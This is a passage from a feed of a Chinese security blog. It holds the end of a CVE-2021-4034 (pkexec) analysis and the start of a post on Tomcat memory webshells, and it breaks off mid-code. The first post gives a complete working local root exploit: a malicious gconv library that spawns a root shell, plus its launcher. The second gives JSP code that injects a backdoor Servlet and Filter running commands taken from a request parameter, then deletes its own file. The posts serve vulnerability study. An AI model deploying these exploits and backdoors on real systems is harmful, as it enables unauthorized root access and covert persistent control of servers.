注意这一句，如果我们传递了参数后，n应该在结束循环时与argc相等，如果没有参数，argc就为0，但是由于此处n的初始值为1，因此如果没有参数被传递，1就变成了argc(0)+1，如果后续继续使用n的话，就有可能出现问题</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      opt_show_help = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--version&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      opt_show_version = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--user&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;-u&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      n++;</span><br><span class="line">      <span class="keyword">if</span> (n &gt;= (guint) argc)</span><br><span class="line">        &#123;</span><br><span class="line">          usage (argc, argv);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (opt_user != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          g_printerr (<span class="string">&quot;--user specified twice\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">      opt_user = g_strdup (argv[n]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--disable-internal-agent&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      opt_disable_internal_agent = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在610行，获取PROGRAM参数名称，也就是需要执行的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">path = g_strdup (argv[n]); <span class="comment">// 分析代码，我们可以发现n在此时被使用，g_strdup复制目标字符串，但是如果我们不传递任何参数，g_strdup用于拷贝字符串，如果没有参数传递，这里就产生内存越界读取了</span></span><br><span class="line"><span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  GPtrArray *shell_argv;</span><br><span class="line"></span><br><span class="line">  path = g_strdup (pwstruct.pw_shell);</span><br><span class="line">  <span class="keyword">if</span> (!path)</span><br><span class="line">&#123;</span><br><span class="line">      g_printerr (<span class="string">&quot;No shell configured or error retrieving pw_shell\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/* If you change this, be sure to change the if (!command_line)</span></span><br><span class="line"><span class="comment">case below too */</span></span><br><span class="line">  command_line = g_strdup (path);</span><br><span class="line">  shell_argv = g_ptr_array_new ();</span><br><span class="line">  g_ptr_array_add (shell_argv, path);</span><br><span class="line">  g_ptr_array_add (shell_argv, <span class="literal">NULL</span>);</span><br><span class="line">  exec_argv = (<span class="keyword">char</span>**)g_ptr_array_free (shell_argv, FALSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) <span class="comment">// 如果路径不是绝对路径</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class="line">  s = g_find_program_in_path (path);</span><br><span class="line">  <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      g_printerr (<span class="string">&quot;Cannot run program %s: %s\n&quot;</span>, path, strerror (ENOENT));</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">  g_free (path);</span><br><span class="line">  argv[n] = path = s; <span class="comment">// 触发越界内存写入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整理一下，得出，在不传递任何参数时，情况如下</p><ol><li>在第 534 行，整数 n 的设置为 1</li><li>在第 610 行，从 argv[1] 越界读取指针路径</li><li>在第 639 行，指针 s 被越界写入 argv[1]</li></ol><p>现在很重要的一点就是，我们想要知道，当越界的<code>argv[1]</code>包含了什么内容</p><p>当我们使用<code>execve()</code>执行一个程序时，内核会将我们的参数、环境字符串以及指针（argv 和 envp）复制到新程序栈的末尾；如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------|</span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |</span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|</span><br><span class="line">     V         V                V           V         V                V</span><br><span class="line"> &quot;program&quot; &quot;-option&quot;           NULL      &quot;value&quot; &quot;PATH=name&quot;          NULL</span><br></pre></td></tr></table></figure><p>也就是说，被越界访问的实际上是<code>envp[0]</code>，其指向第一个环境变量的值，再次总结，我们得到如下</p><ul><li>在第610行，要执行的程序路径由<code>envp[0]</code>给出</li><li>在632行，<code>path</code>的值被传递给<code>g_find_program_in_path()</code></li><li><code>g_find_program_in_path()</code>在PATH环境变量中搜索程序</li><li>如果找到可执行文件，完整的路径返回给<code>pkexec</code>的<code>main()</code>函数</li><li>在639行，完整路径被越界写入到<code>argv[1]</code>也就是<code>envp[0]</code>，这样就覆盖了我们的第一个环境变量</li></ul><p>更准确地来说的话</p><ul><li>如果环境变量被设置为<code>PATH=name</code>，如果目录<code>name</code>存在（如当前的工作目录）并且可执行文件被命名为<code>value</code>，那么<code>name/value</code>字符串的指针就会被越界写入到<code>envp[0]</code></li><li>或者说，如果PATH是<code>PATH=name=.</code>，并且如果<code>PATH=name=.</code>存在且包含名为<code>value</code>的可执行文件，那么<code>name=./value</code>字符串的指针就会被越界写入到<code>envp[0]</code>中</li></ul><p>由于字符串<code>name=./value</code>是我们最后会执行的命令，如果执行了<code>name=./value</code>，这个越界写入允许我们重新引入一个不安全的环境变量，这些被传递到SUID文件的不安全环境变量通常会在<code>main()</code>函数运行之前被删除(由<code>ld.so</code>完成)。接下来我们将基于这一点来进行exploit</p><blockquote><p>要注意：polkit还支持非Linux系统如Solaris 和 BSD, 目前还没有深入分析过，但是OpenBSD是不可利用的，因为它的内核在argc为0时拒绝通过<code>execve</code>执行程序</p></blockquote><p>我们的问题是如何通过重新引入不安全的环境变量来利用这个漏洞，在702行，pkexec完全清除了环境变量，因此可以利用的选项比较少</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clearenv () != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    g_printerr (<span class="string">&quot;Error clearing environment: %s\n&quot;</span>, g_strerror (errno));</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以发现代码中多处调用了GLib的函数<code>g_printerr()</code>，如位于代码126行和408-409行的<code>validate_environment_variable()</code>函数<code>log_message()</code>调用了<code>g_printerr()</code></p><p><code>g_printerr()</code>通常打印UTF-8错误消息，但如果环境变量<code>CHARSET</code>被设置后，其也可以使用其它字符集打印消息。为了将消息从CTF-8转换为其它字符集，<code>g_printerr()</code>调用了<code>iconv_open()</code></p><p>为了进行字符集转换，<code>iconv_open()</code>执行一个共享库。通常来说来源字符集、目标字符集和共享库都通过默认配置文件<code>/usr/lib/gconv/gconv-modules</code>指定。但是环境变量<code>GCONV_PATH</code>可以强制<code>iconv_open()</code>使用另外一个配置文件，通常来说<code>GCONV_PATH</code>是一个不安全变量，会被移除，但是由于前面的漏洞，我们可以将其重新引入</p><blockquote><p>要注意：这个利用技术会在日志中留下痕迹，如SHELL变量在<code>/etc/shells</code>中不存在，或者环境变量中存在可疑数据。然而，请注意，这个漏洞也可以以不留下痕迹的方式利用</p></blockquote><h2 id="构造-Exploit"><a href="#构造-Exploit" class="headerlink" title="构造 Exploit"></a>构造 Exploit</h2><p>目前的主流Linux系统都受到此漏洞的影响，安装一个Ubuntu 20.04，运行<code>pkexec --version</code>可以发现版本是<code>0.105</code></p><p>首先生成一个恶意的so文件，用来获取提权后的shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;PATH=/bin:/usr/bin:/sbin /bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC payload.c -o payload.so</span><br></pre></td></tr></table></figure><p>构造exploit</p><ul><li><code>LC_MESSAGES</code> 用来指定要转换的字符集</li><li><code>XAUTHORITY</code> 设置为非法值以跳过pkexec的正常执行，我们只需要触发日志函数来实现提权</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* _argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span>* _envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XAUTHORITY=..&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    mkdir(<span class="string">&quot;GCONV_PATH=.&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;x&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;x/gconv-modules&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;module  UTF-8//    INTERNAL    ../payload    2\n&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    fp = fopen(<span class="string">&quot;GCONV_PATH=./x&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    chmod(<span class="string">&quot;GCONV_PATH=./x&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, _argv, _envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exp.out</span><br></pre></td></tr></table></figure><p>然后运行<code>./exp.out</code>直接成为root用户</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>参见：<a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683">pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab</a></p><p><img src="../../img/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220129003432841.png" alt="image-20220129003432841"></p><p>argc小于1直接退出程序</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文主要参考官方的&lt;a href=&quot;https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&quot;&gt;Advisory&lt;/a&gt;来进行分析&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://cn.4xpl0r3r.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="https://cn.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="C&amp;C++" scheme="https://cn.4xpl0r3r.com/tags/C-C/"/>
    
    <category term="Linux" scheme="https://cn.4xpl0r3r.com/tags/Linux/"/>
    
    <category term="提权" scheme="https://cn.4xpl0r3r.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb 内存马技术归纳</title>
    <link href="https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"/>
    <id>https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/</id>
    <published>2022-02-11T11:38:47.000Z</published>
    <updated>2022-02-11T11:43:37.752Z</updated>
    
    <content type="html"><![CDATA[<p>本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292</p><span id="more"></span><p>首先我们整理一下几种植入内存马的方式</p><ul><li>基于JSP WebShell植入内存马</li><li>基于JavaWeb RCE漏洞植入内存马<ul><li>真正的无文件落地内存马</li></ul></li><li>通过Java Agent植入内存马</li></ul><p>由于我们使用的是Tomcat，可以通过动态增加Servlet、Filter、Listener来植入内存马，如果技术栈还存在Spring和Shiro等，还可以使用增加Controller等方法</p><h2 id="基于JSP-WebShell植入内存马"><a href="#基于JSP-WebShell植入内存马" class="headerlink" title="基于JSP WebShell植入内存马"></a>基于JSP WebShell植入内存马</h2><blockquote><p>参考：<a href="https://github.com/bitterzzZZ/MemoryShellLearn/tree/main/jsp%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">MemoryShellLearn/jsp注入内存马 at main · bitterzzZZ/MemoryShellLearn (github.com)</a></p></blockquote><h3 id="配置开发环境"><a href="#配置开发环境" class="headerlink" title="配置开发环境"></a>配置开发环境</h3><p>IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9</p><p>为了在JSP中开发内存马，我们需要使用Tomcat的API，虽然在放在Tomcat中就可以直接使用Tomcat的API，但是IDEA无法进行代码提示，因此我们要在项目设置中把Apache Tomcat中的lib文件夹加入项目的Libraries中去，除此之外还要引入tomcat的<code>/bin/tomcat-juli.jar</code></p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126193430429.png" alt="image-20220126193430429"></p><p>完成Libraries的配置后我们的代码就不会因为缺少依赖而出现报错了</p><h3 id="增加Servlet"><a href="#增加Servlet" class="headerlink" title="增加Servlet"></a>增加Servlet</h3><p>Servlet我们都知道，是Tomcat的最基本的服务程序，我们可以直接在内存中增加Servlet来实现无文件的内存马</p><p>增加Servlet的方式分为3个步骤</p><ol><li>利用反射通过<code>ApplicationContextFacade</code>获取到<code>StandardContext</code></li><li>将<code>Servlet</code>程序封装到<code>Wrapper</code></li><li>将封装好的<code>Wrapper</code>增加到<code>StandardContext</code>中并添加地址映射</li></ol><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span>  IOException </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">            HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext(); <span class="comment">// 获取Context</span></span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">// 将Servlet添加到Context中去</span></span><br><span class="line">    BackdoorServlet backdoorServlet = <span class="keyword">new</span> BackdoorServlet();</span><br><span class="line">    org.apache.catalina.Wrapper backdoorWrapper = standardContext.createWrapper();</span><br><span class="line">    backdoorWrapper.setName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    backdoorWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    backdoorWrapper.setServlet(backdoorServlet);</span><br><span class="line">    backdoorWrapper.setServletClass(backdoorServlet.getClass().getName());</span><br><span class="line"><span class="comment">// jiang</span></span><br><span class="line">    standardContext.addChild(backdoorWrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="comment">// 自毁</span></span><br><span class="line"><span class="comment">//    (new File(application.getRealPath(request.getServletPath()))).delete();</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addServlet.jsp</code>写入内存马，然后再访问<code>/hello?admin=&lt;指令&gt;</code>就可以执行命令了</p><h3 id="增加Filter"><a href="#增加Filter" class="headerlink" title="增加Filter"></a>增加Filter</h3><p>由于Filter在Servlet之前运行，因此可以不受URL的限制，甚至可以伪装成在对一个正常的Servlet进行访问</p><p>增加Filter的方式分为4个步骤</p><ol><li>通过反射从<code>ApplicationContextFacade</code>中获取到当前的<code>StandardContext</code>，从<code>StandardContext</code>获取到<code>filterConfigs</code></li><li>封装<code>Filter</code>为<code>FilterDef</code>，并添加到<code>StandContext</code>中</li><li>生成新的<code>ApplicationFilterConfig</code>并添加到<code>filterConfigs</code>中</li><li>创建<code>FilterMap</code>并加入<code>StandardContext</code>中，为<code>Filter</code>确定适用的URL</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorFilter</span> <span class="keyword">extends</span> <span class="title">HttpFilter</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = <span class="string">&quot;BackdoorFilter&quot;</span>;</span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">    field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">        BackdoorFilter filter = <span class="keyword">new</span> BackdoorFilter();</span><br><span class="line">        <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="comment">// 自毁</span></span><br><span class="line">        (<span class="keyword">new</span> File(application.getRealPath(request.getServletPath()))).delete();</span><br><span class="line">    &#125;</span><br><span 